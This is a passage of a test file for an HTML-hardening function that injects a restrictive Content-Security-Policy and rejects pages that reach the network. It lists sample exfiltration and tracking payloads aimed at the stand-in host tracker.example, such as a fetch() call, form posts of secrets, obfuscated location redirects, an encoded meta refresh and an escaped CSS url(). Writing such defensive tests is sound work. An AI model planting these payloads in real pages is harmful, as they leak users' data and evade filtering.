      resourcePolicyEnforcedPerSession: false,
      reason: expect.stringContaining('startup recovery failed'),
    });
  });

  it('injects a restrictive CSP and rejects dynamic or indirect network surfaces', () => {
    const safe = hardenSelfContainedHtml('<!doctype html><html><head><title>Safe</title></head><body><a href="#details">Details</a><a class="link" href="./guide.platform.quickstart.md">Guide</a><style>body{color:red}</style></body></html>');
    expect(safe).toContain('http-equiv="Content-Security-Policy"');
    expect(safe).toContain("connect-src 'none'");
    expect(safe).toContain("form-action 'none'");
    expect(safe).toContain("script-src 'none'");
    expect(safe).not.toContain('frame-ancestors');
    expect(safe).not.toContain('navigate-to');
    expect(safe).toContain('<span data-cds-source-reference="./guide.platform.quickstart.md">Guide</span>');
    expect(safe).not.toContain('href="./guide.platform.quickstart.md"');

    const deceptiveHead = hardenSelfContainedHtml(
      '<!doctype html><html><!--<head>--><style>body{background-image:u\\72l(https://tracker.example/p)}</style><body>ok</body></html>',
    );
    expect(deceptiveHead.indexOf('Content-Security-Policy')).toBeLessThan(deceptiveHead.indexOf('<!--<head>-->'));
    expect(deceptiveHead).toContain("img-src data:");

    const invalidDocuments = [
      '<!doctype html><body>implicit root bypass</body>',
      '<!doctype html><!-- <html> --><body>comment root bypass</body>',
      '<!doctype html><html data-breakout=">"><body>quoted root delimiter</body></html>',
    ];
    for (const html of invalidDocuments) {
      expect(() => hardenSelfContainedHtml(html)).toThrowError(
        expect.objectContaining({ code: 'design_output_invalid' }),
      );
    }

    const unsafe = [
      '<!doctype html><html><img srcset="https://tracker.example/a.png 1x"></html>',
      '<!doctype html><html><body background="https://tracker.example/pixel.png"></body></html>',
      '<!doctype html><html><video poster="https://tracker.example/poster.png"></video></html>',
      '<!doctype html><html><a href="#ok" ping="https://tracker.example/ping">leave</a></html>',
      '<!doctype html><html><style>@import "https://tracker.example/a.css";</style></html>',
      '<!doctype html><html><script>fetch("https://tracker.example/data")</script></html>',
      '<!doctype html><html><script>window.location.href="https://tracker.example/out"</script></html>',
      '<!doctype html><html><script>location.assign("https://tracker.example/out")</script></html>',
      '<!doctype html><html><script>self.location.replace("https://tracker.example/out")</script></html>',
      '<!doctype html><html><script>globalThis["location"].replace("https://tracker.example/out")</script></html>',
      '<!doctype html><html><script>globalThis["lo"+"cation"]="https://tracker.example/out"</script></html>',
      '<!doctype html><html><script>window["open"]("https://tracker.example/out")</script></html>',
      '<!doctype html><html><script>document.createElement("a").click()</script></html>',
      '<!doctype html><html><form action="https://tracker.example/out"><input name="secret"></form></html>',
      '<!doctype html><html><a href=https://tracker.example/out>leave</a></html>',
      '<!doctype html><html><a href=//tracker.example/out>leave</a></html>',
      '<!doctype html><html><a href=/api/private>leave</a></html>',
      '<!doctype html><html><a href=./../private>leave</a></html>',
      '<!doctype html><html><a href=./guides/..>leave</a></html>',
      '<!doctype html><html><iframe srcdoc="&lt;script&gt;top.location=\'https://tracker.example/out\'&lt;/script&gt;"></iframe></html>',
      '<!doctype html><html><button onclick=goAway()>leave</button></html>',
      '<!doctype html><html><head><meta http-equiv="re&#102;resh" content="0;url=https://tracker.example/out"></head></html>',
      '<!doctype html><html><head><meta content="custom" http-equiv="x-product-mode"></head></html>',
      '<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="default-src \'none\'"></head></html>',
    ];
    for (const html of unsafe) {
      expect(() => hardenSelfContainedHtml(html)).toThrowError(
        expect.objectContaining({ code: 'design_output_not_self_contained' }),
      );
    }
  });
});
